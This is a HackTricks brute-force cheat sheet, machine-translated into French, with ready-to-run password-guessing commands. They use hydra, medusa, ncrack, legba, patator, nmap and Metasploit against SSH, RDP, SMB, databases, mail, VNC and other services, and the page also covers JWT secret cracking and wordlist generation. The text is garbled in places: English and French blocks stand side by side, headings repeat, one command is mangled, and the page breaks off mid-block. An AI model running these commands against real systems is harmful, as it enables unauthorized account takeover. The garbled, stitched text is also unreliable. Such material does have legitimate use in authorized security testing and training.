# Brute Force - Fiche de triche

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## Identifiants par défaut

**Recherchez dans Google** les identifiants par défaut de la technologie utilisée, ou **essayez ces liens** :

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Créez vos propres dictionnaires**

Trouvez autant d'informations que possible sur la cible et générez un dictionnaire personnalisé. Outils qui peuvent aider :

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl est un outil qui extrait les mots d'un site Web pour générer une liste de mots potentiels à utiliser dans des attaques de force brute. Il peut être utile pour créer des listes de mots de passe possibles en fonction du contenu d'un site Web.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Générer des mots de passe basés sur vos connaissances de la victime (noms, dates...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Un outil générateur de listes de mots, qui vous permet de fournir un ensemble de mots, vous donnant la possibilité de créer de multiples variations à partir des mots donnés, créant ainsi une liste de mots unique et idéale à utiliser pour un cible spécifique.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listes de mots

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Services

Classés par ordre alphabétique du nom du service.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

---

#### Brute Force

Brute force attacks against the AJP protocol can be carried out using tools like Hydra or Burp Suite Intruder. These tools can be used to guess usernames and passwords by systematically trying all possible combinations until the correct one is found. It is important to note that brute force attacks can be time-consuming and resource-intensive, so they should be used with caution and only in controlled environments.

---

#### Force brute

Les attaques par force brute contre le protocole AJP peuvent être effectuées à l'aide d'outils tels que Hydra ou Burp Suite Intruder. Ces outils peuvent être utilisés pour deviner des noms d'utilisateur et des mots de passe en essayant systématiquement toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Il est important de noter que les attaques par force brute peuvent être longues et gourmandes en ressources, elles doivent donc être utilisées avec prudence et uniquement dans des environnements contrôlés.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra est une base de données NoSQL distribuée conçue pour gérer de grandes quantités de données réparties sur de nombreux serveurs sans point de défaillance unique. Pour effectuer une attaque par force brute sur Cassandra, vous pouvez utiliser des outils comme Hydra, Medusa ou tout autre outil de force brute de votre choix pour tenter de deviner les identifiants et les mots de passe des utilisateurs. Assurez-vous d'avoir l'autorisation appropriée avant de procéder à une attaque par force brute sur un système Cassandra.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

#### Brute Force

Brute force attacks against CouchDB typically involve trying to guess the password for a specific user account by systematically trying all possible combinations of characters until the correct one is found. This can be achieved using automated tools like Hydra or custom scripts.

#### Protection

To protect against brute force attacks, it is recommended to:
- Enforce strong password policies
- Implement account lockout mechanisms after a certain number of failed login attempts
- Monitor login attempts for suspicious activity
- Consider implementing multi-factor authentication for an added layer of security.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registre Docker
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

#### Brute Force

Brute force attacks against Elasticsearch typically involve attempting to guess the credentials of the Elasticsearch instance by trying many different username and password combinations. This can be done using tools like Hydra or Burp Suite Intruder. It is important to note that brute force attacks can be time-consuming and may trigger account lockouts if too many failed attempts are made.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

---

Brute forcing FTP credentials is a common technique used during penetration testing. There are several tools available that can automate the process of attempting to log in to an FTP server using a predefined list of usernames and passwords. Some popular tools for brute forcing FTP include Hydra, Medusa, and Ncrack.

#### Hydra

Hydra is a powerful tool that supports multiple protocols, including FTP. It can perform rapid dictionary attacks or brute force attacks to try to guess the FTP credentials. Here is an example command to use Hydra to brute force FTP credentials:

```bash
hydra -t 4 -l <username> -P <passwords.txt> ftp://<target_ip>
```

In this command:
- `-t 4` specifies the number of parallel tasks to perform
- `-l <username>` specifies the username to use
- `-P <passwords.txt>` specifies the file containing a list of passwords to try
- `ftp://<target_ip>` specifies the FTP server to target

#### Medusa

Medusa is another popular tool for brute forcing FTP credentials. It is known for its speed and reliability. Here is an example command to use Medusa to brute force FTP credentials:

```bash
medusa -u <username> -P <passwords.txt> -h <target_ip> -M ftp
```

In this command:
- `-u <username>` specifies the username to use
- `-P <passwords.txt>` specifies the file containing a list of passwords to try
- `-h <target_ip>` specifies the target IP address
- `-M ftp` specifies the protocol to use (FTP in this case)

#### Ncrack

Ncrack is a high-speed network authentication cracking tool. It can be used to brute force FTP credentials efficiently. Here is an example command to use Ncrack to brute force FTP credentials:

```bash
ncrack -U <usernames.txt> -P <passwords.txt> ftp://<target_ip>
```

In this command:
- `-U <usernames.txt>` specifies the file containing a list of usernames to try
- `-P <passwords.txt>` specifies the file containing a list of passwords to try
- `ftp://<target_ip>` specifies the FTP server to target

When performing brute force attacks against FTP servers, it is essential to have proper authorization to test the security of the system. Unauthorized access attempts can have legal consequences.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### Brute Force Générique HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Authentification de base HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post Form

---

#### Brute Force

Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is often used in combination with automated tools to speed up the process. Brute force attacks can be effective against weak passwords or encryption keys.

#### Dictionary Attack

A dictionary attack involves using a predefined list of words or phrases to attempt to guess the password. This method is more efficient than brute force as it focuses on commonly used passwords or phrases. Dictionary attacks can be successful if the target is using a common or easily guessable password.

#### Rainbow Table Attack

Rainbow table attacks involve precomputed tables of encrypted passwords to quickly crack password hashes. This method is effective against hashed passwords, as it allows attackers to compare the hash of the target password with entries in the rainbow table to find a match.

#### Credential Stuffing

Credential stuffing is a type of brute force attack that involves using automated tools to try large numbers of username and password combinations obtained from data breaches. Attackers use these credentials to gain unauthorized access to user accounts across multiple platforms.

#### Hydra

Hydra is a popular password-cracking tool that supports brute force and dictionary attacks. It can be used to test the security of various protocols and services by attempting to authenticate using different combinations of usernames and passwords.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Pour http**s** vous devez changer de "http-post-form" à "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

#### Brute Force

Brute force attacks against IMAP are typically carried out using the `hydra` tool. The following command can be used to launch a brute force attack against an IMAP server:

```bash
hydra -l <username> -P <passwords_file> -f <target_ip> imap
```

- `<username>`: The username to target.
- `<passwords_file>`: A file containing a list of passwords to try.
- `<target_ip>`: The IP address of the target IMAP server.

This command will attempt to log in to the IMAP server using the provided username and passwords from the specified file.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

### IRC

### IRC
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

#### Brute Force

Brute forcing iSCSI targets is a common technique used to gain unauthorized access to iSCSI storage resources. Attackers can use tools like Hydra or Medusa to automate the process of trying different username and password combinations until the correct one is found. This can be a time-consuming process but can be effective if weak credentials are used. It is important to use strong, complex passwords and implement account lockout policies to prevent successful brute force attacks.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

### JWT
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

### MQTT
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

#### Brute Force

Brute force attacks against MSSQL servers can be performed using tools like **Hydra** or **Ncrack**. These tools allow you to systematically check all possible passwords until the correct one is found. It is important to note that brute force attacks can be time-consuming and resource-intensive, so it is recommended to use them as a last resort.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

#### Brute Force

Brute force attacks against MySQL databases can be carried out using tools like Hydra or SQLMap. These tools can help automate the process of trying different username and password combinations until the correct one is found. It is important to note that brute force attacks can be time-consuming and may trigger account lockouts or other security measures if too many failed attempts are made. It is recommended to use strong and complex passwords, limit login attempts, and implement other security measures to protect against brute force attacks.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

#### Brute Force

Brute force attacks are commonly used to crack passwords by trying all possible combinations until the correct one is found. In OracleSQL, you can perform brute force attacks using tools like Hydra or custom scripts. These tools allow you to automate the process of trying different passwords against a target Oracle database login until the correct one is discovered.

#### Prevention

To prevent brute force attacks in OracleSQL, you can implement measures such as setting strong and complex passwords, enabling account lockout policies, and monitoring login attempts for any suspicious activity. Additionally, regularly updating and patching your Oracle database can help protect against known vulnerabilities that attackers may exploit during a brute force attack.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Pour utiliser **oracle\_login** avec **patator**, vous devez **installer**:
```bash
pip3 install cx_Oracle --upgrade
```
[Bruteforce du hash OracleSQL hors ligne](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** et **11.2.0.3**) :
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

#### Brute Force

Brute force attacks are one of the simplest and most common types of attacks. The attacker tries every possible password until the correct one is found. This method can be effective if the password is weak or if the attacker has a lot of computing power at their disposal.

#### Protection

To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockout policies, and use multi-factor authentication. Additionally, monitoring for multiple failed login attempts can help detect and prevent brute force attacks.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

#### Brute Force

Brute force attacks against PostgreSQL databases can be carried out using tools like Hydra or Metasploit. These tools can attempt to log in to a PostgreSQL database by trying different combinations of usernames and passwords until the correct one is found. It is important to use strong and unique passwords to protect against brute force attacks.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Vous pouvez télécharger le paquet `.deb` à installer depuis [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

#### Brute Force

Brute force attacks against RDP servers are common and can be very effective if proper security measures are not in place. Attackers use automated tools to try a large number of username and password combinations until they find the correct one. This can be mitigated by implementing account lockout policies, using complex passwords, and monitoring for multiple failed login attempts.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

### Redis
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

### Rexec

Rexec is a simple service that allows users to execute commands on a remote system. It is often used during penetration testing to run commands on compromised machines. Brute-forcing Rexec involves trying different username and password combinations to gain unauthorized access to the remote system. This can be achieved using tools like Hydra or custom scripts. It is important to note that brute-forcing Rexec is illegal unless you have explicit permission to do so.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

### Rlogin
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

---

#### Brute Force

Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is usually very effective but can be time-consuming, especially for longer and more complex keys or passwords.

##### Tools

- Hydra
- Medusa
- Ncrack

##### Techniques

- Dictionary Attack
- Hybrid Attack
- Rainbow Table Attack

##### Prevention

- Use complex and long passwords
- Implement account lockout policies
- Use multi-factor authentication
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

### RTSP
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

---

Brute force attacks against SFTP servers can be carried out using tools like Hydra, Medusa, or Ncrack. These tools allow you to automate the process of trying different username and password combinations until the correct one is found. It is important to note that brute force attacks can be time-consuming and resource-intensive, so it is recommended to use them responsibly and with proper authorization.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

#### Brute Force

Brute force attacks against SNMP involve attempting to guess the community string used for authentication. Tools like `onesixtyone` and `snmpwalk` can be used to automate this process. 

#### Dictionary Attacks

Dictionary attacks can also be used against SNMP to guess the community string. Tools like `onesixtyone` and `snmpwalk` can be used for this purpose as well. 

#### SNMP Enumeration

Once the community string is known, SNMP enumeration can be performed to gather information about the target system, such as system description, system name, and more. Tools like `snmpwalk` and `snmp-check` can be used for SNMP enumeration.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

### SMB

Brute force attacks against SMB services are common and can be performed using tools like Hydra, Medusa, or Ncrack. These tools allow an attacker to try different username and password combinations until the correct one is found. It is important to note that brute force attacks can be noisy and may trigger alerts on the target system.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol) is a communication protocol for email transmission. It is widely used for sending emails over the Internet.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS is a protocol that allows a client to establish a connection to a server through a proxy server. It is commonly used in scenarios where network restrictions or firewalls prevent direct connections between the client and the server. By using a SOCKS proxy, the client can route its traffic through the proxy server to reach the destination server.

#### Brute Forcing SOCKS Credentials

Brute forcing SOCKS credentials involves attempting to guess the username and password required to authenticate with a SOCKS proxy server. This can be done using automated tools that systematically try different combinations of usernames and passwords until the correct one is found. Brute forcing SOCKS credentials can be a time-consuming process, but it can be effective if the credentials are weak or easily guessable.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

#### Brute Force

Brute force attacks against SQL Server can be performed using tools like Hydra, Ncrack, or custom scripts. These tools can help automate the process of trying different username and password combinations until the correct one is found.

#### Prevention

To prevent brute force attacks against SQL Server, you can implement the following measures:

1. **Strong Passwords**: Enforce the use of strong, complex passwords to make it harder for attackers to guess.

2. **Account Lockout Policy**: Implement an account lockout policy that locks out an account after a certain number of failed login attempts.

3. **IP Whitelisting**: Restrict access to SQL Server to only whitelisted IP addresses.

4. **Multi-Factor Authentication**: Implement multi-factor authentication to add an extra layer of security to the login process.

5. **Monitoring**: Monitor login attempts and set up alerts for multiple failed login attempts to detect and respond to brute force attacks in real-time.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

#### Brute Force

Brute force attacks against SSH servers are very common. Attackers use automated tools to try all possible username and password combinations until they find the correct one. This can be mitigated by implementing strong password policies, using key-based authentication, and rate-limiting login attempts.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Clés SSH faibles / PRNG prévisible de Debian

Certains systèmes présentent des failles connues dans la graine aléatoire utilisée pour générer du matériel cryptographique. Cela peut entraîner une réduction drastique de l'espace des clés qui peut être brute-forcé avec des outils tels que [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Des ensembles de clés faibles pré-générées sont également disponibles, tels que [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ et OpenMQ)

Le protocole textuel STOMP est un protocole de messagerie largement utilisé qui **permet une communication et une interaction transparentes avec des services de file d'attente de messages populaires** tels que RabbitMQ, ActiveMQ, HornetQ et OpenMQ. Il offre une approche normalisée et efficace pour échanger des messages et effectuer diverses opérations de messagerie.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet est un protocole de communication utilisé pour se connecter à des appareils distants. Il est souvent utilisé par les hackers pour effectuer des attaques de force brute en essayant de deviner les identifiants de connexion en envoyant de multiples combinaisons de noms d'utilisateur et de mots de passe.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

#### Brute Force

Brute forcing VNC involves attempting to login to a VNC server by systematically trying all possible passwords until the correct one is found. This can be achieved using tools like Hydra or Medusa. It is important to note that brute forcing is illegal and unethical unless you have explicit permission to do so.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
